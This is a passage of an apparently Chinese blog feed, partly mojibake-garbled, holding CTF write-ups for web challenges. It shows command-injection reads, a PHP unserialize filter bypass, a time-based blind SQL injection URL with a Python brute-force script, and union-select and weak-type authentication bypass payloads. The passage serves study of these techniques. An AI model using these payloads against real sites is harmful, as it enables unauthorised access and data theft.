class="comment">//$row = mysql_fetch_array($query);</span></span></span><br><span class="line"><span class="php"><span class="comment">//echo $row['id'];</span></span></span><br><span class="line"><span class="php"><span class="comment">//var_dump($row);</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="keyword">while</span>($row=mysql_fetch_array($query))&#123;  <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"del.php?id=&lt;?php echo $row['id'];?&gt;"</span>&gt;</span>åˆ é™¤ç•™è¨€<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'user'</span>]; <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'title'</span>] <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'content'</span>] <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å®‰æ’æ¯12æœˆæœˆèµ›WP</title>
      <link href="/2018/12/23/%E5%AE%89%E6%81%92%E6%9D%AF12%E6%9C%88%E6%9C%88%E8%B5%9BWP/"/>
      <url>/2018/12/23/%E5%AE%89%E6%81%92%E6%9D%AF12%E6%9C%88%E6%9C%88%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><pre><code>è¿™æ¬¡çš„æœˆèµ›å¯ä»¥è¯´éå¸¸é€‚åˆæˆ‘è¿™ç§èœé¸¡åšäº†</code></pre><h2 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2:"></a>ezweb2:</h2><p>è¯·æ±‚åŒ…ä¸­å‘ç°ä¸€ä¸ªuser=base64</p><p>è§£ç å¾—åˆ°user,æ„é€ admin ç„¶åbase64æäº¤</p><p>å‘ç°è·³è½¬åˆ°åå°admin.php</p><p>è¯•äº†ä¸€ä¸ªlså‘ç°æœ‰å›æ˜¾,åº”è¯¥æ˜¯ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´</p><p>æ„é€ : cmd = ls$IFS/  æˆåŠŸå›æ˜¾</p><p>ç„¶åè¯»å–flag:  cmd = cat $IFS /ffLAG_404</p><h2 id="easyï¼š"><a href="#easyï¼š" class="headerlink" title="easyï¼š"></a>easyï¼š</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (file_get_contents($filename))         </span></span><br><span class="line"><span class="php">            &#123;              </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> file_get_contents($filename);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;     </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $data = $_GET[<span class="string">'data'</span>];</span></span><br><span class="line"><span class="php">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(count($matches))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $good = unserialize($data);</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $good;</span></span><br><span class="line"><span class="php">    &#125;     </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="string">"./index.php"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>æœ¬åœ°æ„é€ åºåˆ—åŒ–<br>O:4:â€babyâ€:1:{s:4:â€fileâ€;s:8:â€flag.phpâ€;}</p><p>å› ä¸ºå­˜åœ¨è¿‡æ»¤å‡ºè¯­å¥<br>preg_match(â€˜/[oc]:\d+:/iâ€™,$data,$matches);</p><p>æ‰€ä»¥éœ€è¦ç»•è¿‡,ç”¨åŠ å·è¿›è¡Œç»•è¿‡:<br>O:+4:â€babyâ€:1:{s:4:â€fileâ€;s:8:â€flag.phpâ€;}</p><p>ä½†å¦‚æœç›´æ¥ä¼ å€¼çš„è¯ä¼šï¼ŒæœåŠ¡å™¨æ¥æ”¶åˆ°ä¼šæŠŠåŠ å·è®¤ä¸ºç©ºæ ¼ï¼Œæ‰€ä»¥è¦å¯¹åŠ å·urlç¼–ç ï¼š<br>O:%2b4:â€babyâ€:1:{s:4:â€fileâ€;s:8:â€flag.phpâ€;}</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h2 id="JUJU"><a href="#JUJU" class="headerlink" title="JUJU"></a>JUJU</h2><p> æç¤ºå¥³æœ‹å‹é—®æˆ‘è¿™11åªJUJUå“ªåªå¥½çœ‹ï¼Ÿ<br> å›¾ç‰‡é‡Œæ²¡æœ‰11åªJUJUï¼Œç”¨windexæ”¹ä¸ªé«˜åº¦å³å¯<br>ç„¶åbase32è§£ç å¾—åˆ°flag</p><h2 id="å­¦ä¹ èµ„æ–™"><a href="#å­¦ä¹ èµ„æ–™" class="headerlink" title="å­¦ä¹ èµ„æ–™"></a>å­¦ä¹ èµ„æ–™</h2><p>zipåŠ å¯†ï¼Œä¸€èˆ¬zipåŠ å¯†åªæœ‰é‚£å‡ ç§ï¼Œå¹¶ä¸”æ‰“å¼€zipæ–‡ä»¶é‡Œé¢è¿˜æœ‰ä¸€ä¸ªå·²ç»ç»™å‡ºçš„txtæ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€ä¸ªç»è¿‡åŠ å¯†çš„zipæ–‡ä»¶ï¼Œå¾ˆæ˜æ˜¾æ˜¯æ˜æ–‡æ”»å‡»å°±å¯ä»¥äº†<br>å°†txtæ–‡ä»¶åŠ å¯†ä¸ºzipæ–‡ä»¶,ç„¶åç”¨ARCHPRè¿›è¡Œæ˜æ–‡æ”»å‡»<br>å¾—åˆ°ä¸€ä¸ªdocæ–‡ä»¶æ‰“å¼€,å¾—åˆ°ä¸€ä¸ª5 3 çš„å›¾ç‰‡ï¼ŒæŠŠå›¾ç‰‡ç§»å¼€å°±å¯ä»¥çœ‹åˆ°flagäº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTFå®éªŒå§writeup</title>
      <link href="/2018/12/21/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7writeup/"/>
      <url>/2018/12/21/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7writeup/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="å®éªŒå§writeup"><a href="#å®éªŒå§writeup" class="headerlink" title="å®éªŒå§writeup"></a>å®éªŒå§writeup</h2><ul><li>çœ‹èµ·æ¥æœ‰ç‚¹éš¾åˆ†å€¼</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è€ƒå¯Ÿç‚¹:<span class="built_in">sleep</span>()æ—¶é—´ç›²æ³¨</span><br></pre></td></tr></table></figure><p>seleteè¢«è¿‡æ»¤äº†,åˆ©ç”¨slepp()è¿›è¡Œæ—¶é—´ç›²æ³¨.å…³é”®payload:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' <span class="keyword">and</span> <span class="keyword">case</span> <span class="keyword">when</span>(substr(password,<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'i'</span>) <span class="keyword">then</span> sleep(<span class="number">18</span>) <span class="keyword">else</span> sleep(<span class="number">0</span>) <span class="keyword">end</span> <span class="keyword">and</span> '<span class="string">'='</span>&amp;pass=<span class="number">9</span>&amp;action=login</span><br></pre></td></tr></table></figure><p>è„šæœ¬å¦‚ä¸‹:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' <span class="keyword">and</span> case when(substr(password,<span class="number">1</span>,<span class="number">1</span>)='i') <span class="keyword">then</span> sleep(<span class="number">8</span>) <span class="keyword">else</span> sleep(<span class="number">0</span>) end <span class="keyword">and</span> ''='&amp;pass=&amp;action=login</span><br><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line">guess = <span class="string">"1234567890-_=+qwertyuioplkjhgfdsazxcvbnm?!@#$%^&amp;*"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/basic/inject/index.php"</span></span><br><span class="line"></span><br><span class="line">flag1 = ''</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> guess:</span><br><span class="line">flag = <span class="string">"admin' and case when(substr(password,%s,1)='%s') then sleep(8) else sleep(0) end and ''='&amp;pass=&amp;action=login"</span><span class="symbol">%</span>(i,j)</span><br><span class="line"></span><br><span class="line">data = &#123;'admin':<span class="string">"flag"</span>&#125;</span><br><span class="line"></span><br><span class="line">timestart = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line"></span><br><span class="line">r = requests.<span class="built_in">get</span>(url,params=flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">time</span>.<span class="built_in">time</span>() - timestart &gt; <span class="number">10</span>:</span><br><span class="line">flag1 = flag1 + j</span><br><span class="line"><span class="built_in">print</span>(j)</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><ul><li>çŒ«æŠ“è€é¼ </li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åœ¨è¿”å›æŠ¥çœ‹åˆ°<span class="symbol">:Content-Row</span>: MTU0NTIyNzcyNg==</span><br><span class="line">ç›´æ¥æäº¤å³å¯,ä¸ç”¨è§£å¯†</span><br></pre></td></tr></table></figure><ul><li>å¤´æœ‰ç‚¹å¤§åˆ†å€¼</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹<span class="selector-pseudo">:HTTP</span>å¤´</span><br></pre></td></tr></table></figure><ul><li>è²Œä¼¼æœ‰ç‚¹éš¾åˆ†å€¼</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹<span class="selector-pseudo">:HTTP</span>å¤´,<span class="selector-tag">XXF</span></span><br></pre></td></tr></table></figure><ul><li>è¿™ä¸ªçœ‹èµ·æ¥æœ‰ç‚¹ç®€å•!</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹<span class="selector-pseudo">:SQL</span>æ³¨å…¥,</span><br></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨ <span class="class"><span class="keyword">union</span> è¿›è¡Œæ³¨å…¥,æ²¡æœ‰è¿‡æ»¤ä»»ä½•å­—ç¬¦</span></span><br></pre></td></tr></table></figure><ul><li>PHPå¤§æ³•åˆ†å€¼</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹<span class="symbol">:php</span>ä»£ç å®¡è®¡</span><br><span class="line">è¯•äº†eregi()å¼±ç±»å‹,å‘ç°ä¸è¡Œ</span><br><span class="line">çœ‹åˆ°<span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]); å°è¯•äºŒæ¬¡urlç¼–ç ,æˆåŠŸç»•è¿‡</span><br></pre></td></tr></table></figure><ul><li>what a fuck!è¿™æ˜¯ä»€ä¹ˆé¬¼ä¸œè¥¿?</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹<span class="selector-pseudo">:JSfack</span></span><br><span class="line">å…¨é€‰å¤åˆ¶,åœ¨æµè§ˆå™¨çš„è¿è¡Œå°è¿è¡Œå³å¯</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹: phpå®¡è®¡ + sqlæ³¨å…¥</span><br><span class="line">åœ¨æºç ä¸­çœ‹åˆ°index.txt</span><br><span class="line">å…³é”®ä»£ç :</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select pw from php where user='<span class="variable">$user</span>'"</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, MYSQL_ASSOC);</span><br><span class="line">//<span class="built_in">echo</span> <span class="variable">$row</span>[<span class="string">"pw"</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="variable">$row</span>[pw]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$row</span>[pw]))) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">è¿™é‡Œå–ä¸€æ¡ç»“æœé›†è¿›è¡ŒéªŒè¯,å¯ä½¿ç”¨union select æ„é€ ä¸€æ¡ç»“æœé›†æ¥ç»•è¿‡</span><br><span class="line">payload:</span><br><span class="line">1<span class="string">'union select md5(1) #</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">ä¸ç†è§£å¯ä»¥è‡ªå·±æ­å»ºç¯å¢ƒè¯•è¯•</span></span><br></pre></td></tr></table></figure><ul><li>NSCTF web200</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹:å†™è„šæœ¬èƒ½åŠ›</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">        $_=<span class="string">""</span>;</span></span><br><span class="line"><span class="php">        $str = <span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws "</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $str = str_rot13($str);</span></span><br><span class="line"><span class="php">        $str = strrev($str);</span></span><br><span class="line"><span class="php">        $str = base64_decode($str);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($str); $i++)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $_c = substr($str,$i,<span class="number">1</span>);</span></span><br><span class="line"><span class="php">            $__ = ord($_c)<span class="number">-1</span>;</span></span><br><span class="line"><span class="php">            $_c = chr($__);</span></span><br><span class="line"><span class="php">            $_ .=$_c;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> strrev($_);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>ä¸Šä¼ ç»•è¿‡</li></ul><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹:æ–‡ä»¶ä¸Šä¼ ,<span class="comment">%00æˆªæ–­</span></span><br></pre></td></tr></table></figure><ul><li>FALSE</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">è€ƒç‚¹: hsah1 ç¢°æ’</span></span><br><span class="line">å¯ä»¥ç›´æ¥ä¼ æ•°ç»„å’Œmd5ç¢°æ’ä¸€æ ·çš„è§£æ³•</span><br></pre></td></tr></table></figure><ul><li><p>Guess Next Session</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹ï¼š<span class="keyword">http</span> cookie</span><br><span class="line">ç›´æ¥å°†cookieæ¸…é™¤å³å¯</span><br></pre></td></tr></table></figure></li><li><p>Once More</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹:è€ƒå¯ŸphpåŠå³å¼±ç±»å‹</span><br><span class="line">å½“phpé‡åˆ°æ•°å­—åŠ e çš„æ—¶å€™è¢«è®¤ä¸ºæ˜¯ç§‘å­¦æŠ€æœ¯æ³•ï¼Œ</span><br><span class="line">ereg()å­˜åœ¨%00æˆªæ–­å³é‡åˆ°%00çš„æ—¶å€™è¢«è®¤ä¸ºæ˜¯åŒ¹é…ç»“æŸ</span><br><span class="line">payload:</span><br><span class="line">1e8%00*-*    //æ³¨æ„åœ¨åœ°å€æ æäº¤,ä¸ç„¶%00ä¼šè¢«urlç¼–ç </span><br><span class="line"><span class="link">http://ctf5.shiyanbar.com/web/more.php?password</span>[<span class="string"></span>]=99999999 //ä¹Ÿå¯ä»¥åˆ©ç”¨æ•°ç»„,ereg()åªèƒ½å¤„ç†å­—ç¬¦ä¸²,æ•°ç»„çš„è¯,è¢«è®¤ä¸ºä¸ºNULL</span><br></pre></td></tr></table></figure><ul><li>å¿˜è®°å¯†ç äº†</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹: æºç æ³„éœ²</span><br><span class="line"></span><br><span class="line">æ‰“å¼€ç½‘å€ æŸ¥çœ‹æºç  æ³¨æ„</span><br><span class="line">&lt;meta name=<span class="string">"editor"</span> content=<span class="string">"Vim"</span> /&gt;</span><br><span class="line">VIMç¼–è¾‘å™¨:å½“è¿›è¡Œæ–‡ä»¶ç¼–è¾‘æ—¶ï¼Œå¦‚æœéæ­£å¸¸é€€å‡ºä¼šäº§ç”Ÿä¸€ä¸ª .æ–‡ä»¶å.swp</span><br><span class="line">upload/.step1.php.swp  å‘ç°ä¸è¡Œ,äºæ˜¯æŠ“åŒ…,å‘ç°è·³è½¬åˆ°step2 ç„¶åå‘é€ç»™submit.php</span><br><span class="line">è®¿é—®.submit.php.swp æˆåŠŸè·å¾—æºç </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"æ¾¶è¾«è§¦æµœå——æ†–"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1.</span>è¦æ±‚tokençš„é•¿åº¦ä¸º<span class="number">10</span>ä¸”å€¼ä¸º<span class="number">0</span></span><br><span class="line">åˆ©ç”¨ç§‘å­¦æŠ€æœ¯æ³•<span class="number">0e00000000</span></span><br><span class="line"><span class="number">2.</span>è¦æ±‚$emailAddressçš„å€¼ä¸ºç®¡ç†å‘˜é‚®ç®±</span><br><span class="line">step1æºç ä¸­å·²ç»™å‡º</span><br><span class="line">payload:</span><br><span class="line">submit.php?emailAddress=admin@simplexue.com&amp;token=<span class="number">0e00000000</span></span><br></pre></td></tr></table></figure><ul><li><p>å¤©ç½‘ç®¡ç†ç³»ç»Ÿ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹: phpå¼±ç±»å‹ phpååºåˆ—åŒ–</span><br><span class="line">æŸ¥çœ‹æºç , å‘ç°&lt;!-- <span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">'username'</span>]; <span class="variable">$test</span>=md5(<span class="variable">$test</span>); <span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>) --&gt;</span><br><span class="line">phpä¸­çš„ == ä¸ºå¼±ç­‰äºå· å½“æ¯”è¾ƒç±»å‹ä¸ä¸€æ ·æ—¶ä¼šè¿›è¡Œè½¬æ¢æ¯”å¦‚ <span class="string">'1'</span> == <span class="string">'1dfsgdfsg'</span> ç»“æœä¸ºTure</span><br><span class="line">å› æ­¤åªè¦æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²åŠ 